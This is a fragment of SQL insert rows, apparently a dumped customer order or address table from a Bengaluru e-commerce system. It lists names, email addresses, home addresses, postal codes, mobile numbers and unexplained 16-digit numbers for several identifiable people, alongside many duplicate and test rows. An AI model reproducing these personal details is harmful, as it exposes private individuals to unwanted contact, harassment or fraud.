(3, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(4, 'ashwini', 'ashwiniravi677@gmail.com', 'rajajinagar', 'rajajinagar', '2', 2, '', 'India', '560079', '7760201200', 'ashwini', 'rajajinagar', 'rajajinagar', '', 2, '2', 'India', '560079', '7760201200', '', '3187074190617468'),
(5, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(6, 'syed afroz', 'developerweb50@gmail.com', 'Yelhanka', 'Bengalurus', '2', 2, '', 'India', '562158', '9986571787', 'syed afroz', 'Yelhanka', 'Bengalurus', '', 2, '2', 'India', '562158', '9986571787', '', '3126451136289413'),
(7, 'ashwini', 'ashwiniravi677@gmail.com', 'kolar', 'kolar', '2', 2, '', 'India', '560079', '7760201200', 'ashwini', 'kolar', 'kolar', '', 2, '2', 'India', '560079', '7760201200', '', '7929762044380943'),
(8, 'shilpa', 'shilpa@savithru.com', 'Yeshwanthpur', 'Yeshwanthpur', '2', 2, '', 'India', '560022', '9880566133', 'shilpa', 'Yeshwanthpur', 'Yeshwanthpur', '', 2, '2', 'India', '560022', '9880566133', '', '2882016861612731'),
(9, 'shilpa', 'shilpa@savithru.com', 'Yeshwanthpur', 'Yeshwanthpur', '2', 2, '', 'India', '560022', '9880566133', 'shilpa', 'Yeshwanthpur', 'Yeshwanthpur', '', 2, '2', 'India', '560022', '9880566133', '', '8392698928939068'),
(10, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(11, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(12, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(13, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(14, 'sh', 'sh@gmail.com', 'jalahallivillage', 'Benglore', '2', 2, '', 'India', '560013', '9900599005', 'sh', 'jalahallivillage', 'Benglore', '', 2, '2', 'India', '560013', '9900599005', '', '8358402295596988'),
(15, 'PrathamA', 'pratham@napdesigns.com', 'yeshwantpur', 'yeshwantpur', 'Bengaluru', 2, 'Karnataka', 'India', '560022', '7019117463', 'PrathamA', 'yeshwantpur', 'yeshwantpur', 'Bengaluru', 2, 'Karnataka', 'India', '560022', '7019117463', '', ''),
(16, 'sh', 'sh@gmail.com', 'jalahallivillage', 'Benglore', '2', 2, '', 'India', '560013', '9900599005', 'sh', 'jalahallivillage', 'Benglore', '', 2, '2', 'India', '560013', '9900599005', '', '9130538267598575'),
(17, 'sh', 'sh@gmail.com', 'jalahallivillage', 'Benglore', '2', 2, '', 'India', '560013', '9900599005', 'sh', 'jalahallivillage', 'Benglore', '', 2, '2', 'India', '560013', '9900599005', '', '2785368186887539'),
(18, 'ashwini', 'ashwiniravi677@gmail.com', 'rajajinagar', 'rajajinagar', '2', 2, '', 'India', '560089', '7760201200', 'ashwini', 'rajajinagar', 'rajajinagar', '', 2, '2', 'India', '560089', '7760201200', '', '8649503872311162'),
(19, 'ashwini', 'ashwiniravi677@gmail.com', '198/b 56 th cross, 4th block Rajajinagar, bangalore 560010', 'bangalore', '2', 2, '', 'India', '560010', '7760201200', 'ashwini', '198/b 56 th cross, 4th block Rajajinagar, bangalore 560010', 'bangalore', '', 2, '2', 'India', '560010', '7760201200', '', '9027441004332610'),
(20, 'ashwini', 'ashwiniravi677@gmail.com', '#61 2nd cross Vivekanandanagar', 'Machohalli Gate', '2', 2, '', 'India', '560091', '8660485849', 'Shashikumar V', '#61 2nd cross Vivekanandanagar', 'MachohalliGate', '', 2, '2', 'India', '560091', '8660485849', '', '6940168179022199'),
(21, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(22, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(23, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(24, 'shri', 'shri@gmail.com', 'dajslkdj', 'klsjffkdj', '2', 2, '', 'India', '560013', '9900599005', 'shri', 'dajslkdj', 'klsjffkdj', '', 2, '2', 'India', '560013', '9900599005', '', '5159000435589054'),
(25, 'shri', 'shri@gmail.com', 'dajslkdj', 'klsjffkdj', '2', 2, '', 'India', '560013', '9900599005', 'shri', 'dajslkdj', 'klsjffkdj', '', 2, '2', 'India', '560013', '9900599005', '', '3045351180009152'),
(26, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '7948463852919712'),
(27, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '4203906308939330'),
(28, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '9832895427076737'),
(29, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '6301830439311742'),
(30, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '1677789014515474'),
(31, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '6702006632984129'),
(32, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '6378770226404304'),
(33, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '4455266737494840'),
(34, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '9645004452399636'),
(35, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '7415368863087877'),
(36, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '1347263097470101'),
(37, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '4244721033539724'),
(38, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '6210055802056700'),
(39, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '560064', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '560064', '7090099999', '', '1739901663703162'),
(40, 'syed afroz', 'developerweb50@gmail.com', 'Yelhanka', 'Bengalurus', '2', 2, '', 'India', '560064', '9986571787', 'syed afroz', 'Yelhanka', 'Bengalurus', '', 2, '2', 'India', '560064', '9986571787', '', '5996247330029365'),
(41, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '4643670045186727'),
(42, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '6166010551728560'),
(43, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '2392651219025721'),
(44, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '8504148294607237'),
(45, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '1800592366146106'),
(46, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '5468469074060589'),
(47, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '9903102241443158'),
(48, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '3527132686042278'),
(49, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '9840707598708122'),
(50, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '1532422528491157'),
(51, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '8698826649418225'),
(52, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '5936594206123435'),
(53, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '2462647379304015'),
(54, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '9986571768', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '9986571768', '', '2075099005190065'),
(55, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '5836320929982084'),
(56, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '7584711253459049'),
(57, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '7736612263866240'),
(58, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '9077188088888387'),
(59, 'suresh', 'gvsuresh@savithru.com', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore - 560010', '2', 2, '', 'India', '560010', '9845324064', 'suresh', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore-560010', '', 2, '2', 'India', '560010', '9845324064', '', '5736256669449783'),
(60, 'suresh', 'gvsuresh@savithru.com', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore - 560010', '2', 2, '', 'India', '560010', '9845324064', 'suresh', '251,53rd Cross, 4th Block, Rajajinagar', 'Bangalore-560010', '', 2, '2', 'India', '560010', '9845324064', '', '8632154329427837'),
(61, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '3548021599210751'),
(62, 'ran', 'ran@savithru.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '4347216621619488'),
(63, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '9747028794079156'),
(64, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '5888581069026634'),
(65, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '3485407924140139'),
(66, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '8819174861518268'),
(67, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '9782499080044357'),
(68, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '2812450260122009'),
(69, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '5751118586343448'),
(70, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '2145167262885295'),
(71, 'Suresh', 'gvsureshiyer@gmail.com', '#251, 53rd Cross, 4th Block, Rajajinagar, Bangalore', 'Rajajinagar', '2', 2, '', 'India', '560010', '9845324064', 'Suresh', '#251, 53rd Cross, 4th Block, Rajajinagar, Bangalore', '', '', 2, '2', 'India', '560010', '9845324064', '', '3114621935278658'),
(72, 'Suresh', 'gvsureshiyer@gmail.com', 'No.34,5th Cross, 8th Main, Basaveshwarnagar', 'bangalore', '2', 2, '', 'India', '560079', '9845324064', 'Suresh', 'No.34,5th Cross, 8th Main, Basaveshwarnagar', 'bangalore', '', 2, '2', 'India', '560079', '9845324064', '', '4135653175660682'),
(73, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '5731984620573091'),
(74, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '5502275738908638'),
(75, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '8719071169117008'),
(76, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '4236382468592120'),
(77, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '2', 2, '', 'India', '562121', '9986571787', 'syed afroz', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '', 2, '2', 'India', '562121', '9986571787', '', '1382746093803914'),
(78, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(79, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(80, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(81, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(82, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(83, 'Ashwin', 'ashwin@savithru.com', '43, 1st main road', 'basaveswanagara', '2', 2, '', 'India', '560010', '9535070670', 'Ashwin', '43, 1st main road', 'basaveswanagara', '', 2, '2', 'India', '560010', '9535070670', '', '7523217149483048'),
(84, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '7612869409220610'),
(85, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '6522375965837322'),
(86, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru', 'Bengaluru', '2', 2, '', 'India', '562121', '7090099999', 'Demo', 'Bengaluru', 'Bengaluru', '', 2, '2', 'India', '562121', '7090099999', '', '5467187648222998'),
(87, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '2', 2, '', 'India', '562121', '9986571787', 'syed afroz', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '', 2, '2', 'India', '562121', '9986571787', '', '3312839117894384'),
(88, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '2', 2, '', 'India', '562121', '9986571787', 'syed afroz', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '', 2, '2', 'India', '562121', '9986571787', '', '4548528432441568'),
(89, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '2', 2, '', 'India', '562121', '9986571787', 'syed afroz', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '', 2, '2', 'India', '562121', '9986571787', '', '6750552854219445'),
(90, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '2', 2, '', 'India', '562121', '9986571787', 'syed afroz', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '', 2, '2', 'India', '562121', '9986571787', '', '2181908115602924'),
(91, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '2', 2, '', 'India', '562121', '9986571787', 'syed afroz', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '', 2, '2', 'India', '562121', '9986571787', '', '7269303122573066'),
(92, 'syed afroz', 'developerweb50@gmail.com', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '2', 2, '', 'India', '562121', '9986571787', 'syed afroz', 'Bengaluru,Yelahanka', 'Yelahanka,Bengaluru', '', 2, '2', 'India', '562121', '9986571787', '', '3871064711267767'),
(93, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(94, 'SavithruTechnologies', 'uday@savithru.com', 'Basaveshwaranagar', 'Bangalore', 'Bengaluru', 2, 'Karnataka', 'India', '560079', '9876543210', 'SavithruTechnologies', 'Basaveshwaranagar', 'Bangalore', 'Bengaluru', 2, 'Karnataka', 'India', '560079', '9876543210', '', ''),
(95, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(96, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(97, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(98, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(99, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(100, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(101, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(102, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(103, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(104, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(105, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(106, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(107, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(108, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(109, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(110, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(111, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(112, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
(113, 'AshwinH', 'ashwin@savithru.com', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', 'AshwinH', '43,1stmainroad', 'basaveswanagara', 'Bengaluru', 2, 'Karnataka', 'India', '560010', '9535070670', '', ''),
